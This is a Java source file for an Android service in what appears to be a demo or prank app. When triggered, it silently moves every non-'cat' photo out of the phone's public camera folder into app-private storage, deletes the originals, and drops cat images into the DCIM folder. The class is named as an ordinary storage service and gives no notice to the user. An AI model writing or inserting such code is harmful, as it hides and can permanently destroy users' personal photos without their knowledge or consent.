package com.example.hellotehnopolis;

import android.app.IntentService;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Environment;
import android.util.Log;
import org.apache.commons.io.FileUtils;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

public class StorageService extends IntentService {
    private int count = 0;

    /**
     * Creates an IntentService.  Invoked by your subclass's constructor.
     */
    public StorageService() {
        super("ServiceNamed");
    }


    @Override
    protected void onHandleIntent(Intent intent) {
        File app_path = getApplicationContext().getExternalFilesDir(Environment.DIRECTORY_DCIM);

        File filepath = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);

        try {
            File[] pics = getCameraDirectory(filepath);

            for (File pic : pics) {

                try {
                    if (!pic.getName().contains("cat")) {
                        FileUtils.copyFileToDirectory(pic, app_path);
                        pic.delete();

                        Bitmap bitmap = BitmapFactory.decodeResource(getResources(), R.drawable.cat);
                        saveBitmap(bitmap, filepath);
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        } catch (NullPointerException e) {
            Log.e("NPE", "Camera dir is upset");
        }
    }

    private File[] getCameraDirectory(File dir) {
        File[] pathFiles = dir.listFiles();
        if (pathFiles != null) {
            for (File f : pathFiles
            ) {
                if (f.getName().contains("Camera")) {
                    return f.listFiles();
                }
            }
        }
        return null;
    }

    private void saveBitmap(Bitmap bitmap, File path) {
        try {
            FileOutputStream fos = new FileOutputStream(path + "/cat" + count + ".jpg");
            bitmap.compress(Bitmap.CompressFormat.JPEG, 75, fos);
            fos.flush();
            fos.close();
            count++;
        } catch (Exception e) {
            Log.e("CatNotSaved", e.toString());
        }
    }
}
